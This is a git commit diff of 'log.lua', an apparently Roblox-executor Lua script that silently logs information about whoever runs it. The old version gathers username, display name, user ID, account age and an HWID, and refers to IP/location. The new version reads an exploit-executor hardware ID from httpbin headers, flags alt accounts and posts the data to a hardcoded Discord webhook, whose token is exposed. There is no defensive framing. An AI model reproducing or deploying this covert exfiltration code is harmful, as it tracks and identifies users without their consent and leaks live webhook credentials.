0d48f23c37424c59eb578661d7f6c43e585f5243
Sittapea <103658363+Sittapea@users.noreply.github.com>
2022-11-13 13:29:00 +0200

    Update log.lua

--- log.lua
+++ log.lua
@@ -1,39 +1,71 @@
-local url = "https://discord.com/api/webhooks/1040718395215183963/gWRiRZkz9t5vDwZeJA-UtHBpuJVJhNuBtq8fbDKfqCZZPJfRyNwZbEryZ72pnSH5xTI6"
-local Players = game:GetService("Players")
-local lp = Players.LocalPlayer
-local DisplayName = lp.DisplayName
-local ID = lp.UserId
-local age = lp.AccountAge
-local server = game.PlaceId
-local id = string.match(getrequest.Body, "`(%w+)`")
-local hwid = string.lower(id)
-
-
-function webhook(text, color)
-    local data = {
-        ["avatar_url"] = "",
-        ["username"] = "Info-Logger",
-        ["embeds"] = {
-            {
-                ["title"] = ""..id.." : " ..server.. "",
-                ["description"] = text,
-                ["type"] = "rich",
-                ["color"] = red,
-                ["footer"] = {
-                    ["icon_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..ID.."&width=420&height=420&format=png",
-                    ["text"] = ""..lp.." : "..DisplayName..""
-                }
-            }
-        }
-    }
-    local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-    local headers = {
-        ["content-type"] = "application/json"
-    }
-    request = http_request or request or HttpPost or syn.request
-    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-    request(abcdef)
+plr = game:GetService'Players'.LocalPlayer
+local ALT = false
+if plr.MembershipType == Enum.MembershipType.Premium then
+elseif plr.MembershipType == Enum.MembershipType.None then
+haspremium = false
 end
-
-webhook("```yaml\n                          USER INFO: \nUsername: " ..lp.name..  "\nDisplayName: " ..DisplayName.. "\nUserid: " ..ID.. "\nAge: " ..age.. "\n"  ..server.. "\nJob ID: \n" ..tostring(game.JobId)..                   "\n-------------------------------------------------------------\n OtherInfo:\n Executor Guess: " ..webhookcheck.. "\n IP/Location :" ..ip.. "\n-------------------------------------------------------------  HWID: " ..hwid.."\n```", tonumber(0xFF0000))
+if haspremium == false then 
+if plr.AccountAge <= 7 then 
+    ALT = true
+end
+end
+local market = game:GetService("MarketplaceService")
+local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+local http_request = http_request;
+if syn then
+http_request = syn.request
+elseif SENTINEL_V2 then
+function http_request(tb)
+    return {
+        StatusCode = 200;
+        Body = request(tb.Url, tb.Method, (tb.Body or ''))
+    }
+end
+end
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+hwid = "";
+for i, v in next, hwid_list do
+if decoded.headers[v] then
+    hwid = decoded.headers[v];
+    break
+end
+end
+if hwid then
+local HttpServ = game:GetService('HttpService')
+local url = "https://discord.com/api/webhooks/1041311653653905418/LR_FX6p2qLz1zeaLAOCVHkpdqk-Speg3-1S20KdDxwgUHqRPkOjLR2IyWXKflFSBRPcn"
+local data = 
+{
+    ["content"] = "",
+    ["embeds"] = {{
+        ["title"] = "__**HWID:**__",
+        ["description"] = hwid,
+        ["type"] = "rich",
+        ["color"] = tonumber(0xFFC300),
+        ["fields"] = {
+            {
+                ["name"] = "Username:",
+                ["value"] = Game.Players.LocalPlayer.Name,
+                ["inline"] = true
+            },
+			            {
+                ["name"] = "Is Alt",
+                ["value"] = ALT,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Game Name:",
+                ["value"] = info.Name,
+                ["inline"] = true
+            },
+        },
+    }}
+}
+local newdata = HttpServ:JSONEncode(data)
+local headers = {
+        ["content-type"] = "application/json"
+}
+local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
+http_request(request_payload)
+end
